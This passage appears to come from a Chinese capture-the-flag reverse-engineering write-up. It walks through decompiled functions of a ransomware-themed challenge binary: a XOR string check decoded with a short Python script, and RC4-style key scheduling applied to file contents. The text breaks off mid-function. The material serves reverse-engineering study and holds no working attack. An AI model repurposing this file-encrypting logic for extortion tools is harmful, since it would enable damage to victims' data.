<code>DH~mqqvqxB^||zll@Jq~jkwpmvez{</code> 那一行，跟进到 <code>sub_401A70</code> ，看到下面代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_401A70@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-E4h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+DCh] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v8<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    Str1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>Str1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"DH~mqqvqxB^||zll@Jq~jkwpmvez{\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401037</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"充值成功.\\n\"</span><span class=\"token punctuation\">,</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401037</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"Error!\\n\"</span><span class=\"token punctuation\">,</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v4 <span class=\"token operator\">=</span> Str1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">LOBYTE</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>Str1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v4<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>发现异或操作，使用代码解一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>t<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"DH~mqqvqxB^||zll@Jq~jkwpmvez{\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> t<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    b <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">0x1F</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>运行后，得到 <code>[Warnning]Access_Unauthorized</code></p>\n<p>之后点击第二行的加密，跟进 <code>sub_4014E0</code> ，得到代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_4014E0@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a4<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>File<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>a6<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-D8h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">int</span> v18<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v18 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token function\">sub_4010F0</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>Str<span class=\"token punctuation\">,</span> v18<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">sub_4010C8</span><span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40116D</span><span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token function\">sub_4010EB</span><span class=\"token punctuation\">(</span>v8<span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">,</span> File<span class=\"token punctuation\">,</span> a6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>File<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v11 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v17 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v17<span class=\"token punctuation\">,</span> v10<span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>a6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v13 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v17 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v17<span class=\"token punctuation\">,</span> v12<span class=\"token punctuation\">,</span> v11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  v14 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401037</span><span class=\"token punctuation\">(</span>v13<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"\\n加密成功!\\n您的充值金额不足。\\n\\n\"</span><span class=\"token punctuation\">,</span> v17<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v15<span class=\"token punctuation\">,</span> v14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>在这里，很容易可以猜出对文件内容进行了读取，猜测 flag 就在其中</p>\n<p>依次跟进函数，</p>\n<p>sub_4010F0 --&gt; sub_401800</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_401800@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> a4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+DCh] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a4 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">256</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a3 <span class=\"token operator\">+</span> i <span class=\"token operator\">%</span> a4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      v4 <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> a4 <span class=\"token operator\">&gt;</span> <span class=\"token number\">256</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      v4 <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>sub_4010C8 --&gt; sub_401780</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_401780@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    v2 <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>sub_40116D --&gt; sub_4018E0</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_4018E0@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// STEB_1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-2Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+F4h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a3<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v7 <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v3 <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>sub_4010EB --&gt; sub_4015E0</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_4015E0@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>File<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>a4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> 